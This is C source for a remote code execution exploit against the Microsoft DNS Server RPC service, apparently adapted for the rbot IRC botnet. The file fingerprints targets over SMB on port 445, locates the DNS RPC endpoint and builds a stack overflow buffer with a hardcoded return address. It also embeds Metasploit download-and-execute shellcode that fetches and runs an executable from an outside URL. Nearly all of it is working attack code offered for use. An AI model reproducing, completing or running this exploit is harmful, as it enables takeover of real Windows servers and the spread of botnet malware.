/* Microsoft DNS Server Remote Code execution Exploit and analysis 
   Advisory: http://www.microsoft.com/technet/security/advisory/935964.mspx
   This remote exploit works against port 445 (also Microsoft RPC api used)

  Author:
  * Mario Ballano  ( mballano~gmail.com )  
  * Andres Tarasco ( atarasco~gmail.com )

  ported to rbot by cyberboy for educational and testing purposes :D.

  -removed win2k3 code bcuz its impossible to sploit it.
  -litle fix...
  -tested to sploit win2k server sp4 us/french/itlalian/chinese os.


*/



void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len){ return(malloc(len)); }
void __RPC_USER midl_user_free(void __RPC_FAR * ptr){ free(ptr); }
int fingerprint (char *host);


int fingerprint (char *host) {
   char req1[] =
      "\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
      "\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f"
      "\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02"
      "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f"
      "\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70"
      "\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30"
      "\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54"
      "\x20\x4c\x4d\x20\x30\x2e\x31\x32";
   char req2[] =
      "\x00\x00\x00\xa4\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
      "\x00\x00\x10\x00\x0c\xff\x00\xa4\x00\x04\x11\x0a\x00\x00\x00\x00"
      "\x00\x00\x00\x20\x00\x00\x00\x00\x00\xd4\x00\x00\x80\x69\x00\x4e"
      "\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xe0\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00"
      "\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
      "\x35\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00"
      "\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
      "\x2e\x00\x30\x00\x00\x00\x00";
    
   int sock;
   struct sockaddr_in remote;   
   unsigned char buf[0x300];
   int i;
   
 
   //NetWkstaGetInfo 
   remote.sin_family = AF_INET;
   remote.sin_addr.s_addr = inet_addr(host);
   remote.sin_port = htons(445);	  
   sock=socket(AF_INET, SOCK_STREAM, 0);
   
   if (connect(sock,(struct sockaddr *)&remote, sizeof(remote))>=0) {
      if (send(sock, req1, sizeof(req1),0) >0) {
         if (recv(sock, (char *)buf, sizeof (buf), 0) > 0) {
            if (send(sock, req2, sizeof(req2),0) >0) {
               i=recv(sock, (char *)buf, sizeof (buf), 0);
               if (i>0) {
                  if (buf[0x60-1]==5) {
                     return(buf[0x60]);
                  } 
               } 
            } 
         } 
      } 
   } 
   return(-1);
}

/* win32_downloadexec -  URL=http://www.wolsql.110mb.com/shellcode.exe Size=408 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char buf[] = 
"\x33\xc9\x83\xe9\xa0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46"
"\x0e\x7a\xbd\x83\xeb\xfc\xe2\xf4\xad\x1e\x20\xf7\x75\xc7\x1c\x04"
"\x7a\x0f\xfa\x89\x4c\x97\x98\x47\xad\x0b\x92\x56\xb9\xf1\x85\xcd"
"\x0a\x97\xe3\x24\x85\xf3\x42\x14\xdf\x97\xe3\xaf\x9f\x9b\x68\x54"
"\xc3\x3a\x68\x64\xd7\x1c\x3b\xaf\xac\xab\x68\x50\xc1\xef\xe0\xd7"
"\x54\xe9\xc3\x27\x24\x1c\xad\x30\xec\x7a\xb5\x73\x8e\x1c\xdc\x27"
"\x24\x1c\x11\x4e\xd1\xce\x10\x82\xab\x9f\xba\x7b\x5c\x50\xe7\x61"
"\x3d\x7e\xba\x7b\x81\x1c\x2e\xaf\x99\xb3\xe0\xe7\x0e\x76\xe0\xe5"
"\xec\x5e\x85\xaf\xd7\x1c\xa5\x38\xdc\x54\x22\xc5\xdd\x94\x22\xaf"
"\xdf\x94\x20\xaf\x25\x1c\x14\xa7\x19\x99\x68\xf4\xb5\x93\xba\xcc"
"\x8f\x97\xe3\x24\x5c\x51\xee\x76\x89\x68\xb4\xd8\x85\x1c\x3b\x4e"
"\xde\xce\x0b\x19\xdf\x97\xe3\xa7\x19\x84\xb5\x62\x5f\xa9\x63\x51"
"\x25\x17\xd5\xa4\x81\x14\x0f\x04\x54\x4b\x89\x04\x8c\x68\xb4\xc8"
"\x18\x93\xe0\x78\xbe\xb9\x86\xe3\x9b\x94\xe7\x5c\xba\x97\xe3\x17"
"\x1f\xc7\xb3\x77\x89\xc7\x1c\x73\x23\x1c\x3f\x74\x8c\x68\xb4\xd4"
"\x8f\x68\xb4\xd0\xec\x57\x4f\xa1\x1f\xe2\x1a\x75\x8d\xc1\xb0\xdb"
"\x0d\xcd\xba\x8f\x3d\x79\xd0\xe4\x1c\x7f\xc5\xdb\x20\x68\xa4\x41"
"\xab\xc7\x91\x4b\xbc\xd6\x87\x40\xad\xf2\x90\x57\xdf\xd0\x86\x50"
"\x8c\xee\x90\x50\xba\xfa\xa7\x4d\xad\xf2\x80\x50\xb0\xe5\x9a\x65"
"\xdf\xc0\x8a\x4a\x9a\xef\x86\x47\xdf\xd2\x9b\x4d\xab\xc3\x8b\x56"
"\xba\xf6\x87\x24\x93\xf8\x82\x40\x93\xfe\x81\x56\xbe\xe5\x9a\x65"
"\xdf\xe2\x91\x48\xb2\xf8\x8d\x24\x8a\xc5\xaf\x60\xb0\xe0\x8d\x48"
"\xb0\xf6\x87\x70\xb0\xd1\x8a\x48\xba\xd6\xe3\xd5\x32\x7a\x0a\x87"
"\x69\x21\x0d\xca\x31\x20\x0d\xd2\x2a\x7d\x0b\xd1\x68\x3f\x4b\x8d"
"\x2b\x6c\x54\xde\x29\x63\x55\xce\x2e\x6b\x16\xd1\x25\x61\x1e\xd8"
"\x68\x6b\x02\xd8\xc6\x0e\x7a\xbd";


char *DiscoverPort(char *host, char *uid) {
/* Idea ripped from Sir Dystic Rpcdump */
   char pszStringBinding[256];
   UUID uuid;
   RPC_EP_INQ_HANDLE context;
   RPC_IF_ID id;
   RPC_BINDING_HANDLE handle, handle2;
   unsigned char * ptr;
   unsigned char * ptr2;
   unsigned char * ptr3;

   sprintf(pszStringBinding,"ncacn_ip_tcp:%s",host); //Construct binding
   if (RpcBindingFromStringBinding((unsigned char *)pszStringBinding, &handle) == RPC_S_OK) {
      if (RpcMgmtEpEltInqBegin( handle, RPC_C_EP_ALL_ELTS, NULL, 0, &uuid, &context)== RPC_S_OK)  {
         while ( RpcMgmtEpEltInqNext(context, &id, &handle2, &uuid, &ptr) == RPC_S_OK) {
            UuidToString(&id.Uuid, &ptr2);
            if (strcmp("50abc2a4-574d-40b3-9d66-ee4fd5fba076",(char *)ptr2)==0) {
               char *p;
               RpcBindingToStringBinding(handle2, &ptr3);
               //printf("[+] Found %s version %u.%u\n", ptr2, id.VersMajor, id.VersMinor);
               //printf("[+] RPC binding string: %s\n", ptr3);
               p=strchr((char *)ptr3,'[');
               if (p) {
                  RpcStringFree(&ptr2);
                  p[strlen(p)-1]='\0';
                  return(p+1);
               }             
            }
            RpcStringFree(&ptr2);                                
            if (handle2 != NULL) RpcBindingFree(&handle2);
            if (ptr != NULL)  RpcStringFree(&ptr);
         }
      }
   }
   return(NULL);
}


int dnsrpc( char* pszTarget )
{
   RPC_STATUS status;
   char * pszUuid				 = "50abc2a4-574d-40b3-9d66-ee4fd5fba076";
   char * pszProtocolSequence = "ncacn_np";
   unsigned char * pszNetworkAddress	 = NULL;
   char * pszEndpoint			 = "\\pipe\\dnsserver";
   unsigned char * pszOptions			 = NULL;
   unsigned char * pszStringBinding	 = NULL;

   int os=fingerprint(pszTarget);

   if (os==0) {

   char *port=NULL;

   port=DiscoverPort(pszTarget,"50abc2a4-574d-40b3-9d66-ee4fd5fba076");
   if (port) {
         pszEndpoint=port;
         pszProtocolSequence="ncacn_ip_tcp";
   }

      
   //Create an RPC connection
   status = RpcStringBindingCompose((unsigned char *)pszUuid,(unsigned char *)pszProtocolSequence,pszNetworkAddress,(unsigned char *)pszEndpoint,pszOptions,&pszStringBinding);
   
   
 //  sprintf(sendbuf,"Connecting to %s", pszStringBinding);
  // irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
   
   if (status==RPC_S_OK) {
      status = RpcBindingFromStringBinding(pszStringBinding,&dns);
      if (status==RPC_S_OK) { 
         wchar_t *parama=L"PARAMAA"; //Rpc call parameter1
         unsigned char *paramb=NULL; //Rpc call parameter2 that triggers overflow
         char *paramc="PARAMC";//Rpc call parameter3
         long *paramd = (long *)malloc(50); //Rpc call parameter4
         long *parame=(long *)malloc(50);	 //rpc call paramameter5	
         int i,j;  
                  

            #define BUFSIZE (0x3A2 +8 +24 +sizeof(buf)*2)
            
            paramb=(unsigned char *)malloc(BUFSIZE +1);  //Alloc needed space
            memset(paramb,'\\',BUFSIZE); //Fill the whole buffer with \
            
            for(i=0;i<=0x3A2;i+=2) { //0x3A2 chars needed to trigger the overflow 
               paramb[i+1]='a';
            }               
            
            paramb[0x3a2+1]=0xF8; //overwrite EIP with return address 0x79467EF8  ( kernel32.dll call esp )
            paramb[0x3a2+3]=0x7e; //Change it to match your system
            paramb[0x3a2+5]=0x46; //Just execute findjmp2 kernel32.dll esp
            paramb[0x3a2+7]=0x79; //and have fun :-)
            
            //Pad with 3 DWORDS (our shellcode is at ESP, 12 bytes above)
            memcpy(&paramb[0x3a2+8],"\\a\\a\\a\\a\\b\\b\\b\\b\\c\\c\\c\\c",24);
            
            i=0x3a2+8+24; //set the possition for our shellcode
            for(j=0;j<sizeof(buf);j++) {
               paramb[i+1]=buf[j]; //add the shellcode to the buffer
               i+=2;
            }               
            paramb[BUFSIZE]='\0';            
            
 

         DnssrvQuery(parama,paramb,(unsigned char *)paramc,paramd,parame) ; //send the overflow call

		 return TRUE;
		
      }
   } else return FALSE;
   }

}
